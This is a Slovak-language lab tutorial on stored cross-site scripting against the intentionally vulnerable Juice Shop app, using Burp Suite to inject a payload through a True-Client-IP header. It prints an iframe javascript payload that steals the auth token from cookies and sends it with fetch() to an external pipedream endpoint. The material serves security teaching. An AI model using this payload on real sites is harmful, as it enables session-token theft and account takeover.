# Stored cross site scripting (XSS)

### Prostredie: Juice-Shop - https://github.com/juice-shop/juice-shop#from-sources

- Stored cross site scripting (XSS) je nazývaný stored kvôli tomu, že škodlivý kód je ukladaný v databáze aplikácii a je spustený každý krát keď užívateľ navštívy danú stránku. Ukážeme si krátku ukážku na Juice shop aplikácií.
- Pre tento typ útoku budeme potrebovať taktiež nástroj, ktorý bude zachytávať HTTP požiadavky na server, čo nám umožňuje vidieť a upraviť každú jednu požiadavku. Zaužívaným nástrojom pre tieto potreby je BurSuite 
  (inštalácia - https://portswigger.net/burp/releases/professional-community-2024-2-1-5?requestededition=community&requestedplatform=).
- V Juice shop aplikácií máme samostatnú obrazovku, ktorá zobrazuje poslednú IP adresu z ktorej sme boli prihlásený. Táto posledná IP adresa sa získava z databázy. Pri odhlasovaní z účtu vieme odchytiť požiadavku na odhlásenie
  pomocou BurpSuite a upraviť odosielanú IP adresu, ktorá sa ukladá do databázy.
- Spustíme nástroj BurpSuite a preklikneme sa na tab "Proxy" a následne spustíme "Interceptor" (viď. príloha), ktorý odchytí každý request.


![interceptor](../assets/burp_suite_interceptor.png)

- Škodlivý kód, ktorý vložíme ukradne z cookie súborov aplikácie autentifkačný token a odošle ho na náš vytvorený endpoint (inštalácia https://pipedream.com/requestbin). V ukážke
  v nasledujúcom bode vymeníme endpoint https://eojph9o2kgja7k2.m.pipedream.net v parametri funkcii fetch za endpoint, ktorý sme si teraz vytvorili.
- Pri odchytení požiadavky pridáme do hlavičky requestu ešte jeden atribút True-Client-IP s hodnotou

      iframe src="javascript:const headers = new Headers();headers.append(‘Content-Type‘, ‘text/p-
            lain‘);const body = test: ‘event‘,;const options = method: ‘POST‘,headers,mode: ‘cors‘,body:
            document.cookie.split(‘ ‘)[4].split(‘=‘)[1],;fetch(‘https://eojph9o2kgja7k2.m.pipedream.net‘,
            options);" /iframe

  a požiadavku posunieme na server.
- Pri dalšom prihlasovaní sa pre obrazovku, kde zobrazujeme poslednú IP adresu prihlásenia úž nezobrazí IP adresa ale náš kód, ktorý odošle požidavku na náš server so session tokenom.

- Video návod sa nachádza v priečinku "video_instructions": /video_instructions/stored-xss.mp4 (https://github.com/MatusVetrik/dp-attacks-instructions/blob/main/video_instructions/stored-xss.mp4)
